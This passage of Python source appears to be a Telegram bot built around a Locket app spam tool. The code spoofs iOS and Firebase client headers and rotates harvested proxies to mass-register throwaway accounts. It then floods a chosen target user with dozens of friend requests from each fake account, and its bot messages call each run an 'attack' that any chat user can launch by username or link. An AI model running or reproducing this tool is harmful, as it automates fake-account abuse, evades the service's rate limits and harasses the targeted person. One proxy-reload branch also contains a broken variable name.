            # self._loader_("Attempting to reconnect", 1)
            time.sleep(1.3)
            return self.fetch_token(retry + 1)
    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }
    def firebase_headers_locket(self):
        base_headers=self.headers_locket()
        return {
            'Host': 'www.googleapis.com',
            'baggage': base_headers.get('baggage', ''),
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
            'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
            'sentry-trace': base_headers.get('sentry-trace', ''),
            'Accept-Language': 'vi',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
        }
    def analytics_payload(self):
        return {
            "platform": "ios",
            "experiments": {
                "flag_4": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "43",
                },
                "flag_10": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "505",
                },
                "flag_6": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "2000",
                },
                "flag_3": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_22": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_18": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_17": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1010",
                },
                "flag_16": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "303",
                },
                "flag_15": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_14": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "551",
                },
                "flag_25": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "23",
                },
            },
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {
                    "value": str(self.session_id),
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                },
            },
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }
    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        # Kh√¥ng d√πng prefix m√†u m√® console trong bot, m√† log ra file ho·∫∑c console ƒë∆°n gi·∫£n
        try:
            response=requests.post(
                url,
                headers=headers or self.headers_locket(),
                json=payload,
                proxies=proxies_dict,
                timeout=self.request_timeout,
                verify=False
            )
            response.raise_for_status()
            self.successful_requests+=1
            return response.json() if response.content else True
        except ProxyError:
            # self._print(f"[!] Proxy connection terminated") # Kh√¥ng print console trong bot
            self.failed_requests+=1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests+=1
            if hasattr(e, 'response') and e.response is not None:
                status_code=e.response.status_code
                try:
                    error_data=e.response.json()
                    error_msg=error_data.get(
                        'error', 'Remote server rejected request')
                    # self._print(f"[!] HTTP {status_code}: {error_msg}") # Kh√¥ng print console trong bot
                except:
                    # self._print(f"[!] Server connection timeout") # Kh√¥ng print console trong bot
                    pass
                if status_code == 429:
                    return "too_many_requests"
            # self._print(f"[!] Network error: {str(e)[:50]}...") # Kh√¥ng print console trong bot
            return None
    def setup(self):
        pass # Kh√¥ng d√πng _CTLocket_panel_ trong bot, s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng l·ªánh
    def _input_(self, prompt_text="", section="config"):
        pass # Kh√¥ng d√πng input trong bot
    def _CTLocket_panel_(self):
        pass # Kh√¥ng d√πng panel UI trong bot
    def _extract_uid_locket(self, url: str) -> Optional[str]:
        real_url=self._convert_url(url)
        if not real_url:
            self.messages.append(
                f"Locket account not found, please try again.")
            return None
        parsed_url=urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            self.messages.append(
                f"Locket URL kh√¥ng h·ª£p l·ªá: {parsed_url.hostname}")
            return None
        if not parsed_url.path.startswith("/invites/"):
            self.messages.append(
                f"Link Locket Sai ƒê·ªãnh D·∫°ng: {parsed_url.path}")
            return None
        parts=parsed_url.path.split("/")
        if len(parts) > 2:
            full_uid=parts[2]
            uid=full_uid[:28]
            return uid
        self.messages.append("Kh√¥ng t√¨m th·∫•y UID trong Link Locket")
        return None
    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp=requests.get(
                    url,
                    headers={
                        "User-Agent":
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
                    },
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match=re.search(
                        r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                    if match:
                        parsed=urlparse(match.group(1))
                        query=parse_qs(parsed.query)
                        enc_link=query.get("link", [None])[0]
                        if enc_link:
                            return enc_link
                        else:
                            return None
                    else:
                        return None
                else:
                    return None
            except Exception as e:
                self.messages.append(
                    f"Failed to connect to the Locket server.")
                return ""
        payload={"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers={
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            response=requests.post(
                self.SHORT_URL,
                headers=headers,
                data=urlencode(payload),
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res=response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            self.messages.append("L·ªói k·∫øt n·ªëi t·ªõi API Url.ThanhDieu.Com")
            return ""
        except requests.exceptions.RequestException as e:
            self.messages.append(
                "L·ªói k·∫øt n·ªëi t·ªõi API Url.ThanhDieu.Com " + str(e))
            return ""
        except ValueError:
            self.messages.append("L·ªói k·∫øt n·ªëi t·ªõi API Url.ThanhDieu.Com")
            return ""

# Chuy·ªÉn c√°c h√†m _print, _loader_, v.v. th√†nh h√†m r·ªóng ho·∫∑c b·ªè ƒëi n·∫øu kh√¥ng c·∫ßn hi·ªÉn th·ªã console
def _print(*args, **kwargs):
    pass
def _loader_(message, duration=3):
    pass
def _sequence_(message, duration=1.5, char_set="0123456789ABCDEF"):
    pass
def _randchar_(duration=2):
    pass
def _blinking_(text, blinks=3, delay=0.1):
    pass

def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))
def _rand_name_():
    return _rand_str_(8, chars=string.ascii_lowercase)
def _rand_email_():
    return f"{_rand_str_(15)}@thanhdieu.com"
def _rand_pw_():
    return 'CTLocket' + _rand_str_(4)
def _clear_():
    pass # Kh√¥ng clear console trong bot
def typing_print(text, delay=0.02):
    pass # Kh√¥ng d√πng typing print trong bot
def _matrix_():
    pass # Kh√¥ng d√πng matrix trong bot
def _banner_():
    pass # Kh√¥ng d√πng banner trong bot
def _stats_():
    pass # S·∫Ω hi·ªÉn th·ªã stats trong tin nh·∫Øn bot

def load_proxies():
    proxies=[]
    proxy_urls=config.PROXY_LIST
    # config._print( # Kh√¥ng print console trong bot
    #     f"{xColor.MAGENTA}{Style.BRIGHT}[*] {xColor.CYAN}Initializing proxy collection system...")
    try:
        with open('proxy.txt', 'r') as f:
            file_proxies=[line.strip() for line in f if line.strip()]
            # config._print(
            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Found {xColor.WHITE}{len(file_proxies)} {xColor.GREEN}proxies in local storage (proxy.txt)")
            # config._loader_("Processing local proxies", 1)
            proxies.extend(file_proxies)
    except FileNotFoundError:
        # config._print(
        #     f"{xColor.YELLOW}[!] {xColor.RED}No local proxy file detected, trying currently available proxies...")
        pass
    for url in proxy_urls:
        try:
            # config._print(
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Fetching proxies from {xColor.WHITE}{url}")
            # config._loader_(f"Connecting to {url.split('/')[2]}", 1)
            response=requests.get(url, timeout=config.request_timeout)
            response.raise_for_status()
            url_proxies=[line.strip()
                           for line in response.text.splitlines() if line.strip()]
            proxies.extend(url_proxies)
            # config._print(
            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Harvested {xColor.WHITE}{len(url_proxies)} {xColor.GREEN}proxies from {url.split('/')[2]}")
        except requests.exceptions.RequestException as e:
            # config._print(
            #     f"{xColor.RED}[!] {xColor.YELLOW}Connection failed: {url.split('/')[2]} - {str(e)}")
            pass
    proxies=list(set(proxies))
    if not proxies:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Critical failure: No proxies available for operation")
        return []
    config.total_proxies=len(proxies)
    # config._print(
    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy harvesting complete. {xColor.WHITE}{len(proxies)} {xColor.CYAN}unique proxies loaded")
    return proxies
def init_proxy():
    proxies=load_proxies()
    if not proxies:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Operation aborted: No proxies available")
        # config._loader_("Shutting down system", 1)
        return None, 0 # Tr·∫£ v·ªÅ None n·∫øu kh√¥ng c√≥ proxy
    # config._print(
    #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Randomizing proxy sequence for optimal distribution")
    random.shuffle(proxies)
    # config._loader_("Optimizing proxy rotation algorithm", 1)
    proxy_queue=Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)
    num_threads=len(proxies)
    # config._print(
    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy system initialized with {xColor.WHITE}{num_threads} {xColor.CYAN}endpoints")
    return proxy_queue, num_threads
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str=f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}
    except Exception as e:
        # config._print(
        #     f"{xColor.RED}[!] {xColor.YELLOW}Proxy format error: {e}")
        return None
def get_proxy(proxy_queue, thread_id, stop_event=None):
    try:
        if stop_event is not None and stop_event.is_set():
            return None
        proxy_str=proxy_queue.get_nowait()
        return proxy_str
    except queue.Empty:
        if stop_event is None or not stop_event.is_set():
            # config._print(
            #     f"{xColor.RED}[Thread-{thread_id:03d}] {xColor.YELLOW}Proxy pool exhausted")
            pass
        return None
def excute(url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
    return config.excute(url, headers, payload, thread_id, step, proxies_dict)
def step1b_sign_in(email, password, thread_id, proxies_dict):
    if not email or not password:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[‚úó] Authentication failed: Invalid credentials")
        return None
    payload={
        "email": email,
        "password": password,
        "clientType": "CLIENT_TYPE_IOS",
        "returnSecureToken": True
    }
    vtd=excute(
        f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
        headers=config.firebase_headers_locket(),
        payload=payload,
        thread_id=thread_id,
        step="Auth",
        proxies_dict=proxies_dict
    )
    if vtd and 'idToken' in vtd:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.GREEN}[‚úì] Authentication successful")
        return vtd.get('idToken')
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[‚úó] Authentication failed")
    return None
def step2_finalize_user(id_token, thread_id, proxies_dict):
    if not id_token:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[‚úó] Profile creation failed: Invalid token")
        return False
    first_name=config.NAME_TOOL
    last_name=' '.join(random.sample([
        'üòÄ', 'üòÇ', 'üòç', 'ü•∞', 'üòä', 'üòá', 'üòö', 'üòò', 'üòª', 'üòΩ', 'ü§ó',
        'üòé', 'ü•≥', 'üòú', 'ü§©', 'üò¢', 'üò°', 'üò¥', 'üôà', 'üôå', 'üíñ', 'üî•', 'üëç',
        '‚ú®', 'üåü', 'üçé', 'üçï', 'üöÄ', 'üéâ', 'üéà', 'üåà', 'üê∂', 'üê±', 'ü¶Å',
        'üòã', 'üò¨', 'üò≥', 'üò∑', 'ü§ì', 'üòà', 'üëª', 'üí™', 'üëè', 'üôè', 'üíï', 'üíî',
        'üåπ', 'üçí', 'üçâ', 'üçî', 'üçü', '‚òï', 'üç∑', 'üéÇ', 'üéÅ', 'üéÑ', 'üéÉ', 'üîî',
        '‚ö°', 'üí°', 'üìö', '‚úàÔ∏è', 'üöó', 'üè†', '‚õ∞Ô∏è', 'üåä', '‚òÄÔ∏è', '‚òÅÔ∏è', '‚ùÑÔ∏è', 'üåô',
        'üêª', 'üêº', 'üê∏', 'üêù', 'ü¶Ñ', 'üêô', 'ü¶ã', 'üå∏', 'üå∫', 'üå¥', 'üèÄ', '‚öΩ', 'üé∏'
    ], 5)) if config.USE_EMOJI else '' # D·ª±a v√†o USE_EMOJI ƒë·ªÉ quy·∫øt ƒë·ªãnh c√≥ th√™m emoji kh√¥ng
    username=_rand_name_()
    payload={
        "data": {
            "username": username,
            "last_name": last_name,
            "require_username": True,
            "first_name": first_name
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=excute(
        f"{config.API_BASE_URL}/finalizeTemporaryUser",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Profile",
        proxies_dict=proxies_dict
    )
    if result:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.GREEN}[‚úì] Profile created: {xColor.YELLOW}{username}")
        return True
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[‚úó] Profile creation failed")
    return False
def step3_send_friend_request(id_token, thread_id, proxies_dict):
    if not id_token:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[‚úó] Connection failed: Invalid token")
        return False
    payload={
        "data": {
            "user_uid": config.TARGET_FRIEND_UID,
            "source": "signUp",
            "platform": "iOS",
            "messenger": "Messages",
            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            "share_history_eligible": True,
            "rollcall": False,
            "prompted_reengagement": False,
            "create_ofr_for_temp_users": False,
            "get_reengagement_status": False
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=excute(
        f"{config.API_BASE_URL}/sendFriendRequest",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Friend",
        proxies_dict=proxies_dict
    )
    if result:
        # config._print(
        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.GREEN}[‚úì] Connection established with target")
        return True
    # config._print(
    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[‚úó] Connection failed")
    return False
def _cd_(message, count=5, delay=0.2):
    pass # Kh√¥ng d√πng countdown trong bot

# === H·∫øt ph·∫ßn d√°n code ===

# C·∫•u h√¨nh bot Telegram
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" # Thay YOUR_BOT_TOKEN_HERE b·∫±ng token c·ªßa bot b·∫°n
bot = telebot.TeleBot(BOT_TOKEN)

# Kh·ªüi t·∫°o config to√†n c·ª•c
config = CTLocket()

# Dictionary ƒë·ªÉ l∆∞u tr·∫°ng th√°i c·ªßa t·ª´ng ng∆∞·ªùi d√πng
user_states = {} # user_id: {"command": "locket", "target": None, "username_custom": None, "use_emoji": True, "message_id": None}
last_command_time = {} # user_id: last_timestamp

# Proxy management for bot
bot_proxy_queue = Queue()
bot_num_threads = 0
proxy_reload_time = 5 * 60 # 5 ph√∫t
last_proxy_reload = time.time()
stop_proxy_reload_event = threading.Event()

def reload_proxies_periodically():
    global bot_proxy_queue, bot_num_threads, last_proxy_reload
    while not stop_proxy_reload_event.is_set():
        if time.time() - last_proxy_reload >= proxy_reload_time:
            bot_proxy_queue, bot_num_threads = init_proxy()
            if bot_num_threads == 0:
                print("Warning: No proxies loaded after reload.")
            last_proxy_reload = time.time()
            print(f"Proxies reloaded at {datetime.datetime.now()}")
        time.sleep(60) # Ki·ªÉm tra m·ªói 1 ph√∫t

# B·∫Øt ƒë·∫ßu lu·ªìng t·∫£i l·∫°i proxy ƒë·ªãnh k·ª≥
proxy_reload_thread = threading.Thread(target=reload_proxies_periodically)
proxy_reload_thread.daemon = True
proxy_reload_thread.start()

# H√†m ƒë·ªÉ l·∫•y proxy t·ª´ queue v√† t·ª± ƒë·ªông reload n·∫øu h·∫øt
def get_bot_proxy():
    global bot_proxy_queue, bot_num_threads
    try:
        proxy_str = bot_proxy_queue.get_nowait()
        bot_proxy_queue.put(proxy_str) # Add back to end of queue for continuous rotation
        return format_proxy(proxy_str)
    except queue.Empty:
        # N·∫øu h·∫øt proxy, c·ªë g·∫Øng reload ngay l·∫≠p t·ª©c (ngo√†i lu·ªìng ƒë·ªãnh k·ª≥)
        bot_proxy_queue, bot_num_threads = init_proxy()
        if bot_num_num_threads == 0:
            return None # Th·∫≠t s·ª± kh√¥ng c√≥ proxy n√†o
        return get_bot_proxy() # Th·ª≠ l·∫°i sau khi reload

def run_locket_attack(chat_id, user_id, message_id, target_uid, username_custom, use_emoji):
    try:
        config.TARGET_FRIEND_UID = target_uid
        config.NAME_TOOL = username_custom
        config.USE_EMOJI = use_emoji
        
        # Kh·ªüi t·∫°o l·∫°i bi·∫øn ƒë·∫øm request cho m·ªói l·∫ßn t·∫•n c√¥ng
        config.successful_requests = 0
        config.failed_requests = 0

        # S·ªë v√≤ng l·∫∑p mong mu·ªën (2-3 v√≤ng cho VIP)
        num_loops = random.randint(2, 3) 
        
        total_accounts_created = 0
        
        for loop in range(num_loops):
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                  text=f"‚è≥Ô∏è ƒêang ch·∫°y v√≤ng {loop+1}/{num_loops}...\n"
                                       f"T·ªïng s·ªë y√™u c·∫ßu th√†nh c√¥ng: <b>{config.successful_requests}</b>\n"
                                       f"T·ªïng s·ªë y√™u c·∫ßu th·∫•t b·∫°i: <b>{config.failed_requests}</b>",
                                  parse_mode='HTML')
            
            threads = []
            stop_event = threading.Event() # Event ƒë·ªÉ d·ª´ng c√°c lu·ªìng
            
            current_loop_successful = 0
            current_loop_failed = 0

            proxy_queue_for_loop, num_threads_for_loop = init_proxy()
            if num_threads_for_loop == 0:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text="‚ùå Kh√¥ng c√≥ proxy kh·∫£ d·ª•ng ƒë·ªÉ ch·∫°y t·∫•n c√¥ng.",
                                      parse_mode='HTML')
                break # Tho√°t kh·ªèi v√≤ng l·∫∑p n·∫øu kh√¥ng c√≥ proxy

            for i in range(num_threads_for_loop):
                thread = threading.Thread(target=worker_locket_attack, 
                                          args=(i, proxy_queue_for_loop, stop_event, chat_id, message_id))
                threads.append(thread)
                thread.daemon = True
                thread.start()
            
            # Ch·ªù c√°c lu·ªìng ho√†n th√†nh trong m·ªôt kho·∫£ng th·ªùi gian nh·∫•t ƒë·ªãnh
            # Ho·∫∑c c√≥ th·ªÉ ƒë·∫∑t m·ªôt ng∆∞·ª°ng s·ªë l∆∞·ª£ng account th√†nh c√¥ng
            max_wait_time_per_loop = 120 # 2 ph√∫t m·ªói v√≤ng l·∫∑p
            start_loop_time = time.time()
            
            while threading.active_count() > 3 and (time.time() - start_loop_time < max_wait_time_per_loop) and not stop_event.is_set():
                time.sleep(5) # Ki·ªÉm tra m·ªói 5 gi√¢y
                
                # C·∫≠p nh·∫≠t s·ªë li·ªáu th√†nh c√¥ng/th·∫•t b·∫°i v√† g·ª≠i tin nh·∫Øn
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text=f"‚è≥Ô∏è ƒêang ch·∫°y v√≤ng {loop+1}/{num_loops}...\n"
                                           f"T·ªïng s·ªë y√™u c·∫ßu th√†nh c√¥ng: <b>{config.successful_requests}</b>\n"
                                           f"T·ªïng s·ªë y√™u c·∫ßu th·∫•t b·∫°i: <b>{config.failed_requests}</b>",
                                      parse_mode='HTML')

            stop_event.set() # D·ª´ng t·∫•t c·∫£ c√°c lu·ªìng sau khi h·∫øt th·ªùi gian ho·∫∑c ƒë·∫°t m·ª•c ti√™u
            for t in threads:
                t.join(timeout=1) # Ch·ªù c√°c lu·ªìng k·∫øt th√∫c gracefully
            
            current_loop_successful = config.successful_requests - total_accounts_created # accounts t·∫°o th√†nh c√¥ng trong v√≤ng n√†y
            total_accounts_created = config.successful_requests

            if current_loop_successful == 0 and loop > 0: # N·∫øu kh√¥ng t·∫°o ƒë∆∞·ª£c t√†i kho·∫£n n√†o trong v√≤ng n√†y v√† kh√¥ng ph·∫£i v√≤ng ƒë·∫ßu ti√™n
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                      text=f"‚ùå V√≤ng {loop+1}/{num_loops} th·∫•t b·∫°i, d·ª´ng t·∫•n c√¥ng.\n"
                                           f"T·ªïng s·ªë y√™u c·∫ßu th√†nh c√¥ng: <b>{config.successful_requests}</b>\n"
                                           f"T·ªïng s·ªë y√™u c·∫ßu th·∫•t b·∫°i: <b>{config.failed_requests}</b>",
                                      parse_mode='HTML')
                break # Tho√°t kh·ªèi v√≤ng l·∫∑p n·∫øu kh√¥ng th√†nh c√¥ng
        
        final_message = (f"‚úÖ Attack ƒë√£ ho√†n th√†nh!\n"
                         f"Username c·ªßa chi·∫øn d·ªãch: <code>{username_custom}</code>\n"
                         f"Target UID: <code>{target_uid}</code>\n"
                         f"T·ªïng s·ªë y√™u c·∫ßu th√†nh c√¥ng: <b>{config.successful_requests}</b>\n"
                         f"T·ªïng s·ªë y√™u c·∫ßu th·∫•t b·∫°i: <b>{config.failed_requests}</b>")
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_message, parse_mode='HTML')
        
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text=f"‚ùå ƒê√£ c√≥ l·ªói x·∫£y ra trong qu√° tr√¨nh t·∫•n c√¥ng: {e}", parse_mode='HTML')

def worker_locket_attack(thread_id, proxy_queue, stop_event, chat_id, message_id):
    # H√†m n√†y t∆∞∆°ng t·ª± step1_create_account nh∆∞ng ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh cho bot
    # B·ªè c√°c ph·∫ßn print ra console v√† thay b·∫±ng logic ƒë·ªÉ x·ª≠ l√Ω qua bot
    while not stop_event.is_set():
        current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
        proxies_dict = format_proxy(current_proxy)
        proxy_usage_count = 0
        failed_attempts = 0
        max_failed_attempts = 3 # Gi·∫£m s·ªë l·∫ßn th·ª≠ l·∫°i tr√™n c√πng m·ªôt proxy ƒë·ªÉ nhanh chuy·ªÉn proxy kh√°c

        if not current_proxy:
            # N·∫øu kh√¥ng c√≥ proxy, c√≥ th·ªÉ ch·ªù ho·∫∑c tho√°t lu·ªìng n·∫øu stop_event ƒë∆∞·ª£c set
            time.sleep(1) 
            continue # Th·ª≠ l·∫°i proxy kh√°c
        
        while not stop_event.is_set() and proxy_usage_count < config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
            if stop_event.is_set():
                return
            if not current_proxy: # N·∫øu proxy b·ªã ƒë√°nh d·∫•u l√† "ch·∫øt" ho·∫∑c "h·∫øt gi·ªõi h·∫°n"
                current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
                proxies_dict = format_proxy(current_proxy)
                if not current_proxy:
                    # bot.send_message(chat_id, f"Thread {thread_id}: Kh√¥ng c√≥ proxy kh·∫£ d·ª•ng, ch·ªù...")
                    time.sleep(1)
                    break # Tho√°t kh·ªèi v√≤ng l·∫∑p hi·ªán t·∫°i, ƒë·ªÉ lu·ªìng ch·ªù proxy m·ªõi
            
            email = _rand_email_()
            password = _rand_pw_()

            payload = {
                "data": {
                    "email": email,
                    "password": password,
                    "client_email_verif": True,
                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
                    "platform": "ios"
                }
            }
            if stop_event.is_set():
                return
            response_data = excute(
                f"{config.API_BASE_URL}/createAccountWithEmailPassword",
                headers=config.headers_locket(),
                payload=payload,
                thread_id=thread_id,
                step="Register",
                proxies_dict=proxies_dict
            )

            if stop_event.is_set():
                return
            if response_data == "proxy_dead" or response_data == "too_many_requests":
                failed_attempts += 1
                current_proxy = None # ƒê√°nh d·∫•u proxy n√†y l√† kh√¥ng d√πng ƒë∆∞·ª£c n·ªØa cho l·∫ßn sau
                continue

            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
                proxy_usage_count += 1
                failed_attempts = 0 # Reset s·ªë l·∫ßn th·∫•t b·∫°i n·∫øu th√†nh c√¥ng
                if stop_event.is_set():
                    return
                id_token = step1b_sign_in(email, password, thread_id, proxies_dict)
                if stop_event.is_set():
                    return
                if id_token:
                    if step2_finalize_user(id_token, thread_id, proxies_dict):
                        if stop_event.is_set():
                            return
                        first_request_success = step3_send_friend_request(id_token, thread_id, proxies_dict)
                        if first_request_success:
                            # TƒÉng 50 request cho VIP
                            for _ in range(50):
                                if stop_event.is_set():
                                    return
                                step3_send_friend_request(id_token, thread_id, proxies_dict)
                    else:
                        pass # Profile creation failed, not critical for spam
                else:
                    pass # Auth failed, not critical for spam
            else:
                failed_attempts += 1 # TƒÉng s·ªë l·∫ßn th·∫•t b·∫°i n·∫øu t·∫°o account th·∫•t b·∫°i
        
        # N·∫øu ƒë√£ d√πng h·∫øt quota tr√™n proxy ho·∫∑c proxy b·ªã ch·∫øt, tho√°t v√≤ng l·∫∑p ƒë·ªÉ l·∫•y proxy m·ªõi
        # N·∫øu failed_attempts ƒë·∫°t ng∆∞·ª°ng, thread n√†y s·∫Ω t·ª± ƒë·ªông l·∫•y proxy m·ªõi ·ªü v√≤ng l·∫∑p ngo√†i.


@bot.message_handler(commands=['locket'])
def handle_locket_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check cooldown
    if user_id in last_command_time:
        time_since_last_command = time.time() - last_command_time[user_id]
        if time_since_last_command < 300: # 5 ph√∫t = 300 gi√¢y
            remaining_time = int(300 - time_since_last_command)
            bot.reply_to(message, f"B·∫°n c·∫ßn ch·ªù {remaining_time // 60} ph√∫t {remaining_time % 60} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh n√†y.", parse_mode='HTML')
            return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Vui l√≤ng cung c·∫•p Username ho·∫∑c Link Locket. V√≠ d·ª•: `/locket username_hoac_link`", parse_mode='HTML')
        return

    target_input = args[1].strip()

    # Reset tr·∫°ng th√°i ng∆∞·ªùi d√πng
    user_states[user_id] = {
        "command": "locket",
        "target": None,
        "username_custom": "CTLocket Tool Pro", # Default
        "use_emoji": True, # Default
        "message_id": None
    }

    sent_message = bot.reply_to(message, "‚è≥Ô∏è ƒêang ki·ªÉm tra Username ho·∫∑c Link Locket...", parse_mode='HTML')
    user_states[user_id]["message_id"] = sent_message.message_id
    
    # Ki·ªÉm tra v√† l·∫•y UID trong m·ªôt lu·ªìng ri√™ng ƒë·ªÉ tr√°nh block bot
    threading.Thread(target=check_and_set_target, args=(chat_id, user_id, sent_message.message_id, target_input)).start()

def check_and_set_target(chat_id, user_id, message_id, target_input):
    global config # S·ª≠ d·ª•ng config to√†n c·ª•c

    if not target_input.startswith(("http://", "https://")) and not target_input.startswith("locket."):
        url_to_check = f"https://locket.cam/{target_input}"
    else:
        url_to_check = target_input

    if url_to_check.startswith("locket."):
        url_to_check = f"https://{url_to_check}"

